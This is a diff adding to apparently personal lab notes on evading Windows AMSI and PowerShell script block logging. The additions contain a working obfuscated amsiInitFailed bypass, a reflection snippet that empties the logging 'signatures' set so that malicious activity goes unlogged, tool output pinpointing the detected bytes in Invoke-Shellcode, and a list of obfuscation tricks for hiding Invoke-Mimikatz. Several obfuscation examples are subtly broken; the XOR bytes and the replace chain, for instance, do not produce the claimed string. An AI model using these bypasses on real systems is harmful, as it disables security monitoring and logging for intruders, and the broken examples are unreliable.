@@ -90,6 +90,14 @@ The `DisableScanningNetworkFiles` setting in Microsoft Defender controls whether
 ```Powershell
 Set-MpPreference -DisableScanningNetworkFiles $true
 ```
+### AMSI Settings
+```powershell
+Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableScriptScanning
+
+DisableRealtimeMonitoring DisableScriptScanning
+------------------------- ---------------------
+                    False                 False
+```
 
 # LAB - Evading AMSI
 
@@ -455,3 +463,351 @@ output =
 [Ref].Assembly.GetType(("{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}"-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField(("{0}{1}{2}" -f 'amsi','InitFa','iled'),("{1}{0}{4}{2}{3}" -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
 ```
 
+# AMSI-Trigger
+```powershell
+AmsiTrigger.exe -i=C:\temp\Invoke-Shellcode.ps1 -f=2 -d
+```
+```powershell
+PS C:\temp> AmsiTrigger.exe -i=C:\temp\Invoke-Shellcode.ps1 -f=2 -d
+[1]     "Invoke-Shellcode"
+[8]     "Invoke-Shellcode"
+[34]    "Invoke-Shellcode"
+[38]    "Invoke-Shellcode"
+[46]    "Invoke-Shellcode"
+[54]    "Invoke-Shellcode"
+[189]   "Inject-RemoteShellcode"
+[301]   "Inject-LocalShellcode"
+[491]   "Inject-RemoteShellcode"
+[515]   "Inject-LocalShellcode"
+
+
+Chunks Processed: 17
+Triggers Found: 10
+AmsiScanBuffer Calls: 2160
+Total Execution Time: 3.7543251 s
+```
+
+# GoCheck64.exe
+
+```powershell
+PS C:\temp> gocheck64.exe .\Invoke-Shellcode.ps1 --amsi
+
+[*] Threat detected in original file, beginning AMSI binary search...
+[*] Scanning .\Invoke-Shellcode.ps1, analysing 23807 bytes...
+
+[+] AMSI - 2.1105264s
+[!] Isolated bad bytes at offset 0x52D2 in the original file [approximately 21202 / 23807 bytes]
+00000000  65 6d 6f 74 65 54 68 72  65 61 64 41 64 64 72 20  |emoteThreadAddr |
+00000010  3d 20 47 65 74 2d 50 72  6f 63 41 64 64 72 65 73  |= Get-ProcAddres|
+00000020  73 20 6b 65 72 6e 65 6c  33 32 2e 64 6c 6c 20 43  |s kernel32.dll C|
+00000030  72 65 61 74 65 52 65 6d  6f 74 65 54 68 72 65 61  |reateRemoteThrea|
+00000040  64 0d 0a 20 20 20 20 20  20 20 20 24 43 72 65 61  |d..        $Crea|
+00000050  74 65 52 65 6d 6f 74 65  54 68 72 65 61 64 44 65  |teRemoteThreadDe|
+00000060  6c 65 67 61 74 65 20 3d  20 47 65 74 2d 44 65 6c  |legate = Get-Del|
+00000070  65 67 61 74 65 54 79 70  65 20 40 28 5b 49 6e 74  |egateType @([Int|
+
+[+] Total time elasped: 2.1139199s
+PS C:\temp> gocheck64.exe .\Invoke-Shellcode.ps1 --defender
+[*] Found Windows Defender at C:\Program Files\Windows Defender\MpCmdRun.exe
+[*] Scanning .\Invoke-Shellcode.ps1, analysing 23807 bytes...
+[*] Threat detected in the original file, beginning binary search...
+
+[!] 0x0 -> 0x52A4 - malicious: false - 2.0659043s
+
+[+] Windows Defender - 2.8526233s
+[!] Isolated bad bytes at offset 0x52D2 in the original file [approximately 21202 / 23807 bytes]
+00000000  73 20 6b 65 72 6e 65 6c  33 32 2e 64 6c 6c 20 43  |s kernel32.dll C|
+00000010  72 65 61 74 65 52 65 6d  6f 74 65 54 68 72 65 61  |reateRemoteThrea|
+
+[*] Trojan:PowerShell/Powersploit
+[*] Trojan:PowerShell/Powersploit.A
+
+[+] Total time elasped: 2.8569887s
+```
+
+# TEST IF AMSI IS BYPASSED
+
+The EICAR test string should no longer trigger, proving AMSI in no longer working:
+
+```powershell
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+```
+# POWERSHELL OBFUSCATION TECHNIQUES (Invoke-Obfuscation)
+
+## List of PowerShell Obfuscation Techniques
+
+### 1. Backtick (`) Character for Line Continuation
+- **Description**: The backtick (`) is PowerShell’s escape character, used to continue a command across multiple lines or escape special characters. In obfuscation, it breaks up strings or commands to make them harder to read or match against signatures (e.g., AMSI’s detection of `Invoke-Mimikatz`).
+- **Example**:
+  ```powershell
+  $cmd = "Invo" + "ke-Mi" + "mikatz"
+  & $cmd
+  ```
+  - **Explanation**: The backtick splits `Invoke-Mimikatz` across lines, and concatenation reconstructs it. This can evade simple string matching by AMSI, though modern AMSI may still detect the final executed string.
+
+### 2. String Concatenation
+- **Description**: Combining multiple string fragments to form a command or keyword, avoiding direct use of sensitive terms (e.g., `AmsiUtils`). This breaks up detectable patterns and is often paired with other techniques like backticks.
+- **Example**:
+  ```powershell
+  $part1 = "Invo"
+  $part2 = "ke-Mimi"
+  $part3 = "katz"
+  $command = $part1 + $part2 + $part3
+  Invoke-Expression $command
+  ```
+  - **Explanation**: Concatenates `Invoke-Mimikatz` from fragments, executed via `Invoke-Expression`. AMSI may still detect the final script block if it reconstructs the string.
+
+### 3. Base64 Encoding
+- **Description**: Encodes a script or command as a Base64 string, which is decoded and executed at runtime using `FromBase64String` or PowerShell’s `-EncodedCommand` parameter. This hides the script’s content in a non-readable format.
+- **Example**:
+  ```powershell
+  $base64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output "Invoke-Mimikatz"'))
+  $script = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($base64))
+  Invoke-Expression $script
+  ```
+  - **Explanation**: Encodes `Write-Output "Invoke-Mimikatz"` as Base64, decodes, and executes it. AMSI may scan the decoded script block, so this alone may not bypass detection.
+
+### 4. String Replacement
+- **Description**: Replaces parts of a string with alternative characters or substrings at runtime to reconstruct a command, avoiding direct use of sensitive keywords.
+- **Example**:
+  ```powershell
+  $cmd = "Xnvokx-MxmXkXtz"
+  $cmd = $cmd -replace 'X', 'i' -replace 'x', 'e' -replace 'X', 'a'
+  Invoke-Expression $cmd
+  ```
+  - **Explanation**: Replaces placeholders to form `Invoke-Mimikatz`. This can evade static analysis, but AMSI may detect the final string after replacement.
+
+### 5. Character Encoding (ASCII/Unicode)
+- **Description**: Represents characters using their ASCII or Unicode values, constructing strings dynamically to avoid literal keywords.
+- **Example**:
+  ```powershell
+  $cmd = [char]73 + [char]110 + [char]118 + [char]111 + [char]107 + [char]101 + '-' + [char]77 + [char]105 + [char]109 + [char]105 + [char]107 + [char]97 + [char]116 + [char]122
+  Invoke-Expression $cmd
+  ```
+  - **Explanation**: Uses ASCII values (e.g., 73 = `I`, 110 = `n`) to build `Invoke-Mimikatz`. This is harder to read but may still be detected by AMSI after execution.
+
+### 6. Variable Name Obfuscation
+- **Description**: Uses random, complex, or misleading variable names to obscure the script’s purpose, making it harder for analysts to understand.
+- **Example**:
+  ```powershell
+  $x7a9pQ = "Invoke-Mimikatz"
+  &$x7a9pQ
+  ```
+  - **Explanation**: Assigns `Invoke-Mimikatz` to a random variable name and executes it. This doesn’t evade AMSI but complicates manual analysis.
+
+### 7. Invoke-Expression (Dynamic Execution)
+- **Description**: Uses `Invoke-Expression` (or aliases like `iex`) to execute dynamically constructed strings, hiding the final command until runtime.
+- **Example**:
+  ```powershell
+  $cmd = "Write" + "-Output 'Invoke-Mimikatz'"
+  Invoke-Expression $cmd
+  ```
+  - **Explanation**: Builds and executes a command dynamically. AMSI scans the final script block, so this alone may not bypass detection.
+
+### 8. Splatting
+- **Description**: Uses a hashtable to pass parameters or commands, obscuring the command structure by breaking it into key-value pairs.
+- **Example**:
+  ```powershell
+  $splat = @{
+      Cmdlet = "Write-Output"
+      Argument = "Invoke-Mimikatz"
+  }
+  & $splat.Cmdlet $splat.Argument
+  ```
+  - **Explanation**: Executes `Write-Output "Invoke-Mimikatz"` via splatting. This obscures the command but doesn’t prevent AMSI from scanning the final script block.
+
+### 9. Format Operator (-f)
+- **Description**: Uses the `-f` operator to format strings dynamically, constructing commands or keywords from placeholders.
+- **Example**:
+  ```powershell
+  $cmd = "{0}-{1}" -f "Invoke", "Mimikatz"
+  Invoke-Expression $cmd
+  ```
+  - **Explanation**: Formats `Invoke-Mimikatz` using `-f`. AMSI may detect the final string after formatting.
+
+### 10. Obfuscated String Splitting
+- **Description**: Splits a string into substrings and reassembles it at runtime, often using arrays or random splits to avoid detection.
+- **Example**:
+  ```powershell
+  $parts = @("In", "vo", "ke-", "Mimi", "katz")
+  $cmd = $parts -join ""
+  Invoke-Expression $cmd
+  ```
+  - **Explanation**: Splits `Invoke-Mimikatz` into an array and joins it. This can evade static analysis, but AMSI scans the joined string.
+
+### 11. XOR Encoding
+- **Description**: Applies XOR operations to encode strings, decoding them at runtime with a key to reconstruct the original command.
+- **Example**:
+  ```powershell
+  $key = 0x42
+  $encoded = [byte[]]@(0x2f, 0x38, 0x3f, 0x37, 0x2b, 0x65, 0x20, 0x29, 0x3c, 0x3c, 0x2b, 0x2a, 0x38, 0x3d)
+  $decoded = $encoded | ForEach-Object { $_ -bxor $key }
+  $cmd = [Text.Encoding]::ASCII.GetString($decoded)
+  Invoke-Expression $cmd  # Decodes to "Invoke-Mimikatz"
+  ```
+  - **Explanation**: XOR-encodes `Invoke-Mimikatz`, decodes at runtime. This is harder to detect statically, but AMSI may scan the decoded string.
+
+### 12. Environment Variable Substitution
+- **Description**: Uses environment variables to store parts of a command, substituting them at runtime to build the script.
+- **Example**:
+  ```powershell
+  $env:PART1 = "Invoke"
+  $env:PART2 = "Mimikatz"
+  $cmd = "$env:PART1-$env:PART2"
+  Invoke-Expression $cmd
+  ```
+  - **Explanation**: Stores `Invoke` and `Mimikatz` in environment variables. This spreads the command across system state, but AMSI scans the final script block.
+
+### 13. Comment Injection
+- **Description**: Inserts comments or irrelevant code to obscure the script’s logic, making it harder to analyze manually.
+- **Example**:
+  ```powershell
+  # This is a harmless script
+  $cmd = "Invoke-Mimikatz" # Just a test
+  # Some unrelated comment
+  &$cmd
+  ```
+  - **Explanation**: Adds comments to distract analysts. Doesn’t evade AMSI but complicates human review.
+
+### 14. Randomized Case (Mixed Case)
+- **Description**: Uses mixed upper and lower case for commands or strings to avoid exact string matches.
+- **Example**:
+  ```powershell
+  $cmd = "iNvOkE-mImIkAtZ"
+  Invoke-Expression $cmd
+  ```
+  - **Explanation**: Randomizes case for `Invoke-Mimikatz`. PowerShell is case-insensitive, so this executes, but AMSI normalizes case for detection.
+
+### 15. Pipeline Obfuscation
+- **Description**: Uses complex pipelines with `ForEach-Object`, `Where-Object`, or other cmdlets to obscure command construction.
+- **Example**:
+  ```powershell
+  $parts = @("Invoke", "Mimikatz")
+  $cmd = $parts | ForEach-Object { $_ } | Join-String -Separator "-"
+  Invoke-Expression $cmd
+  ```
+  - **Explanation**: Builds `Invoke-Mimikatz` through a pipeline. This adds complexity but doesn’t prevent AMSI from scanning the final string.
+
+### 16. Compressed Scripts
+- **Description**: Compresses a script using `System.IO.Compression` (e.g., Deflate or GZip), decompressing and executing it at runtime.
+- **Example**:
+  ```powershell
+  $script = 'Write-Output "Invoke-Mimikatz"'
+  $bytes = [Text.Encoding]::Unicode.GetBytes($script)
+  $ms = New-Object IO.MemoryStream
+  $cs = New-Object IO.Compression.DeflateStream($ms, [IO.Compression.CompressionMode]::Compress)
+  $cs.Write($bytes, 0, $bytes.Length)
+  $cs.Close()
+  $compressed = $ms.ToArray()
+  $ms.Close()
+  # Decompress and execute
+  $ms = New-Object IO.MemoryStream(,$compressed)
+  $ds = New-Object IO.Compression.DeflateStream($ms, [IO.Compression.CompressionMode]::Decompress)
+  $reader = New-Object IO.StreamReader($ds)
+  $decompressed = $reader.ReadToEnd()
+  Invoke-Expression $decompressed
+  ```
+  - **Explanation**: Compresses the script, decompresses, and executes. This hides the script statically, but AMSI scans the decompressed script block.
+
+### 17. Reflection-Based Obfuscation
+- **Description**: Uses .NET reflection to access and execute commands or types dynamically, avoiding direct cmdlet names.
+- **Example**:
+  ```powershell
+  $type = [Type]::GetType("System.Management.Automation.PowerShell")
+  $ps = $type::Create()
+  $cmd = "Invoke-Mimikatz"
+  $ps.AddScript($cmd).Invoke()
+  ```
+  - **Explanation**: Uses reflection to invoke PowerShell commands. This is complex but still subject to AMSI scanning of the script block.
+
+### 18. Whitespace Obfuscation
+- **Description**: Adds excessive whitespace, tabs, or newlines to make the script harder to read without changing functionality.
+- **Example**:
+  ```powershell
+  $cmd      =      "Invoke-Mimikatz"
+  &     $cmd
+  ```
+  - **Explanation**: Adds whitespace to obscure the script. Doesn’t evade AMSI but complicates manual analysis.
+
+## Connection to our Context
+
+- **AMSI Evasion**: Many of these techniques (e.g., concatenation, Base64, XOR) aim to evade AMSI’s detection of terms like `Invoke-Mimikatz` or `AmsiUtils`. However, your tests showed AMSI blocks `Invoke-Mimikatz` and `AmsiUtils` bypass attempts regardless of the `signatures` field, as AMSI uses `AmsiScanBuffer` and Defender’s signatures. Obfuscation may delay detection but often fails against modern AMSI, which normalizes and scans the final script block.
+- **Script Block Logging**: Terms in `signatures` (e.g., `VirtualAlloc`, `Add-Type`) trigger Event ID 4104 warnings, as you observed. Obfuscating these terms (e.g., via concatenation or encoding) could prevent logging if the `signatures` field is intact, but clearing `signatures` (as you did) already stops these warnings. Obfuscation might further reduce logging visibility.
+- **.NET Executables/IAT Hooking**: Obfuscation operates at the managed code level, like `signatures` or `AmsiUtils`, so it’s unrelated to IAT hooking, which is ineffective for .NET EXEs. Hooking `AmsiScanBuffer` could intercept obfuscated scripts during AMSI scanning.
+
+## Effectiveness Against AMSI and Logging
+
+- **AMSI**: Modern AMSI (as of May 2025) is robust, normalizing obfuscated scripts (e.g., decoding Base64, resolving concatenation) before scanning with `AmsiScanBuffer`. Your tests showed `Invoke-Mimikatz` and `AmsiUtils` bypasses are blocked, likely in Defender’s logs (Event IDs 1007, 1116, 1117).
+- **Event ID 4104**: Obfuscating `signatures` terms (e.g., `VirtualAlloc` as `Virt` + `ualAlloc`) may prevent Event ID 4104 if the exact term isn’t matched, but clearing `signatures` already achieves this, as you observed.
+- **Logs for AMSI Blocks**: AMSI-blocked scripts (e.g., `Invoke-Mimikatz`) don’t generate Event ID 4104 because they’re blocked pre-execution. Check `Microsoft-Windows-Windows Defender/Operational` for Event IDs 1116/1117.
+
+**Check Defender Logs**:
+   - Verify AMSI blocks for `Invoke-Mimikatz`:
+     ```powershell
+     Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterHashtable @{Id=1116} -MaxEvents 10
+     ```
+
+
+
+
+# POWERSHELL LOGGING (WARNINGS)
+
+```powershell
+write-host "VirtualAlloc"
+write-host "Invoke-Mimikatz"
+
+$result = [ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
+$result.Count
+
+$newHashSet = New-Object 'System.Collections.Generic.HashSet[string]'
+[ScriptBlock].GetField('signatures', 'NonPublic, Static').SetValue($null, $newHashSet)
+
+$result = [ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
+$result.Count
+
+write-host "VirtualAlloc"
+write-host "Invoke-Mimikatz"
+```
+
+----
+
+```powershell
+[ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+```
+no more warnings = not even on the actual bypass (only informational logging)
+
+----
+
+Why No Event ID 4104 for Invoke-Mimikatz When AMSI Blocks It?
+When you type Invoke-Mimikatz (or run Write-Output "Invoke-Mimikatz") and AMSI blocks it with the error This script contains malicious content and has been blocked by your antivirus software, you expect an Event ID 4104 in the Microsoft-Windows-PowerShell/Operational log, but it’s missing. Here’s why:
+
+AMSI Blocks Before Execution:
+AMSI scans script blocks before they are executed by PowerShell. When AMSI (via Microsoft Defender) detects a malicious pattern like Invoke-Mimikatz, it blocks the script block immediately, preventing it from reaching the execution stage where Script Block Logging (Event ID 4104) would occur.
+Event ID 4104 is generated when a script block is executed and contains terms from the signatures field (e.g., VirtualAlloc) or other logging triggers. Since Invoke-Mimikatz is blocked pre-execution, PowerShell never logs it as an executed script block.
+Script Block Logging Scope:
+Script Block Logging (Event ID 4104) captures script blocks that are successfully parsed and executed, even if they contain sensitive terms like VirtualAlloc. These terms, listed in the signatures field, trigger logging with a Warning level but don’t necessarily cause AMSI to block unless they match a malicious pattern.
+For Invoke-Mimikatz, AMSI’s high-confidence detection (due to its association with the Mimikatz tool) halts the script block before PowerShell’s execution pipeline, bypassing the logging stage.
+Why VirtualAlloc Generates Event ID 4104:
+Unlike Invoke-Mimikatz, VirtualAlloc is a sensitive but not inherently malicious term. It’s included in the signatures field (as seen in your earlier output) and triggers Event ID 4104 warnings when used in a script block because:
+The script block executes successfully (AMSI doesn’t block it).
+PowerShell’s logging checks the signatures field and flags VirtualAlloc for logging.
+Example:
+powershell
+
+Copy
+Write-Output "VirtualAlloc"
+This executes, and because VirtualAlloc is in signatures, PowerShell logs it as Event ID 4104 with a Warning level.
+AMSI’s Preemptive Blocking:
+AMSI uses AmsiScanBuffer (in amsi.dll) to scan script content during PowerShell’s parsing phase. If a script block contains a known malicious pattern (e.g., Invoke-Mimikatz or the AmsiUtils bypass), AMSI signals Defender to block it, raising a ParserError exception (ScriptContainedMaliciousContent) before execution or logging.
+This explains why Invoke-Mimikatz and the AmsiUtils bypass ([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)) were blocked without Event ID 4104 logs.
+
+----
+Where Are AMSI-Blocked Events Logged?
+AMSI-blocked events (like Invoke-Mimikatz) are not logged as Event ID 4104 in the Microsoft-Windows-PowerShell/Operational log because they don’t reach execution. Instead, they are typically logged by Microsoft Defender in its own event logs. Here’s where to find them:
+
+Microsoft Defender Event Logs:
+Log Name: Microsoft-Windows-Windows Defender/Operational
+Event IDs:
+Event ID 1007: Indicates a malware scan result, including when AMSI blocks a script. This event may capture details about the blocked script block (e.g., Invoke-Mimikatz).
+Event ID 1116: Indicates a malware detection, often used when Defender blocks a script or file based on AMSI’s input.
+Event ID 1117: Indicates a malware action taken (e.g., blocking or quarantining the script).
